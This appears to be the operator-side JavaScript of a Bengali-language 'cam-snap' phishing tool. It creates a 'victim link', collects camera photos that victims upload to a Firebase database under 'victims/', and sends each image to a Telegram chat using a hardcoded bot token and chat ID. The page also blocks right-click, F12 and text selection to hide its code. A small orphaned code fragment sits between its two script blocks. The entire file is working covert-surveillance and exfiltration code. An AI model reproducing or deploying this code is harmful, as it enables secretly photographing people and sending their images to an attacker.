  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
  <script>
    const msgs = ["লজ্জা করো","আবারো?","পাপ হবে","হাত ব্যাথা করেনা?","না প্লিজ"," এরে এবার থাম","ব্লক করবো","আহারে…","যাও যাও","নিজে লেখো"];
    let first = true;

    document.oncontextmenu = e => {
        e.preventDefault();
        if (first) {
            first = false;
            Swal.fire({
                title: "আরে না না",
                text: "কোড চুরি করবা? আমার খুব কষ্ট হবে",
                icon: "warning",
                confirmButtonText: "সরি, আর করবো না",
                allowOutsideClick: false,
                allowEscapeKey: false,
                background: "rgba(255, 255, 255, 0.95)",
                backdrop: "rgba(59, 130, 246, 0.5)",
                color: "#1e40af",
                confirmButtonColor: "#3b82f6",
                customClass: {
                    popup: "border border-blue-50 shadow-2xl",
                    title: "font-bold text-2xl",
                    confirmButton: "hover:scale-105 transition-transform"
                }
            });
        } else {
            const msg = msgs[Math.floor(Math.random() * msgs.length)];
            Swal.fire({
                toast: true,
                title: msg,
                position: "top-end",
                timer: 2200,
                timerProgressBar: true,
                showConfirmButton: false,
                icon: "error",
                background: "linear-gradient(135deg, #3b82f6, #1e40af)",
                color: "#fff",
                customClass: {
                    popup: "animate__animated animate__fadeInRight shadow-lg border-l-4 border-white",
                    title: "font-semibold text-lg"
                },
                didOpen: (toast) => {
                    toast.addEventListener('mouseenter', Swal.stopTimer);
                    toast.addEventListener('mouseleave', Swal.resumeTimer);
                }
            });
        }
    };

    document.onkeydown = e => {
        if (e.ctrlKey || e.key === "F12" || (e.shiftKey && e.ctrlKey)) {
            e.preventDefault();
            Swal.fire({toast:true, title:"চিটিং করবা না", timer:1500, position:"top", background:"#1e40af", color:"#fff"});
        }
    };

    document.body.style.userSelect = "none";
  </script>

        });
        document.onselectstart = function(e) { return false; };
        document.ondragstart = function(e) { return false; };

<script>
const BOT_TOKEN = "8214148154:AAH5jfutrpIUR5NxR1Ed522IysoLhQ6YhWY";
const CHAT_ID = "7731349577";

const firebaseConfig = {
  apiKey:"AIzaSyDTBla5gMV15V9HWBKAVYTWFt-CBrFfpzo",
  authDomain:"cam-snap-8e956.firebaseapp.com",
  databaseURL:"https://cam-snap-8e956-default-rtdb.firebaseio.com",
  projectId:"cam-snap-8e956",
  appId:"1:982089892260:web:2cfa5a4d3b3dbcf45d0131"
};
firebase.initializeApp(firebaseConfig);
const db = firebase.database();

let currentId = localStorage.getItem("currentCamId") || null;
const SENT_KEY = "sent_images_" + (currentId || ""); // প্রতি লিংকের জন্য আলাদা

function getSentImages() {
  const saved = localStorage.getItem(SENT_KEY);
  return saved ? new Set(JSON.parse(saved)) : new Set();
}

function markAsSent(base64) {
  const sent = getSentImages();
  if (!sent.has(base64)) {
    sent.add(base64);
    localStorage.setItem(SENT_KEY, JSON.stringify([...sent]));
  }
}

if(currentId){
  document.getElementById("linkBox").style.display = "block";
  document.getElementById("victimLink").value = location.href.split('index.html')[0] + "view.html?id=" + currentId;
  loadPhotos(currentId);
}

function generateLink(){
  currentId = Date.now().toString(36);
  localStorage.setItem("currentCamId", currentId);
  
  // পুরাতন সেন্ট লিস্ট ক্লিয়ার (শুধু এই ডোমেইনের)
  Object.keys(localStorage).forEach(key => {
    if (key.startsWith("sent_images_") && key !== "sent_images_" + currentId) {
      localStorage.removeItem(key);
    }
  });

  const link = location.href.split('index.html')[0] + "view.html?id=" + currentId;
  document.getElementById("linkBox").style.display = "block";
  document.getElementById("victimLink").value = link;
  document.getElementById("grid").innerHTML = "";
  document.getElementById("noimg").style.display = "block";
  loadPhotos(currentId);
}

function copyLink(){
  document.getElementById("victimLink").select();
  document.execCommand("copy");
  alert("কপি হয়ে গেছে!");
}

function deletePhoto(key, cardElement){
  if(confirm("এই ছবি মুছে ফেলতে চাও?")){
    db.ref("victims/"+currentId+"/"+key).remove();
    cardElement.parentElement.remove();
  }
}

async function sendToTelegram(base64){
  const sent = getSentImages();
  if (sent.has(base64)) return; // ইতিমধ্যে পাঠানো হয়েছে

  try{
    markAsSent(base64); // এখনই মার্ক করি
    const blob = await (await fetch(base64)).blob();
    const file = new File([blob], "photo.jpg", {type:"image/jpeg"});
    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('photo', file);
    form.append('caption', `নতুন ছবি!\nলিংক: ${location.href.split('index.html')[0] + "view.html?id=" + currentId}`);
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {method:'POST', body:form});
  }catch(e){
    console.error(e);
  }
}

function downloadImage(imgSrc) {
  const a = document.createElement('a');
  a.href = imgSrc;
  a.download = 'SnapCam_' + new Date().getTime() + '.jpg';
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
}

function loadPhotos(id){
  const ref = db.ref("victims/"+id);
  
  ref.on("child_added", s => {
    const key = s.key;
    const data = s.val();
    if (!data?.data) return;

    const base64 = data.data;

    // সবসময় কার্ড দেখাবে (রিফ্রেশেও থাকবে)
    const existingCard = Array.from(document.querySelectorAll('.card img')).some(img => img.src === base64);
    if (!existingCard) {
      document.getElementById("noimg").style.display = "none";
      const card = document.createElement("div");
      card.className = "card";
      card.innerHTML = `
        <img src="${base64}" onclick="window.open('${base64}')">
        <div class="time">${new Date(data.time).toLocaleTimeString('bn-BD')}</div>
        <div class="download-btn" onclick="downloadImage('${base64}')" title="ডাউনলোড"><i class="fas fa-download"></i></div>
        <div class="delete-btn" onclick="deletePhoto('${key}', this)" title="মুছে ফেলুন"><i class="fas fa-trash-alt"></i></div>
      `;
      document.getElementById("grid").appendChild(card);
    }

    // কিন্তু টেলিগ্রামে শুধু একবার পাঠাবে
    sendToTelegram(base64);
  });

  setTimeout(() => { 
    ref.off();
    ref.remove(); 
    localStorage.removeItem("currentCamId");
    localStorage.removeItem("sent_images_" + id);
  }, 3600000);
}
</script>
